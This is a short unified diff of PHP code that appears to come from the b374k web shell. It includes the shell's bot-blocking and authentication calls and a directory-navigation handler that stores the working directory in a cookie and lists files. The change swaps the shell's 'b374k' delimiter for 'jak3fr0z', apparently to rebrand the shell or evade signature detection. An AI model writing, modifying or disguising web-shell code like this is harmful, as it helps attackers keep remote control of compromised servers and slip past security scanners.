@@ -1,4 +1,5 @@
 <?php
+
 block_bot();
 auth();
 chdir(get_cwd());
@@ -85,7 +86,7 @@ if(isset($p['cd'])){
 		chdir($path);
 		$path = $path.DIRECTORY_SEPARATOR;
 		setcookie("cwd", $path);
-		$res = $path."{[|b374k|]}".get_nav($path)."{[|b374k|]}";
+		$res = $path."{[|jak3fr0z|]}".get_nav($path)."{[|jak3fr0z|]}";
 		if(isset($p['showfiles'])&&($p['showfiles']=='true')){
 			$res .= show_all_files($path);
 		}
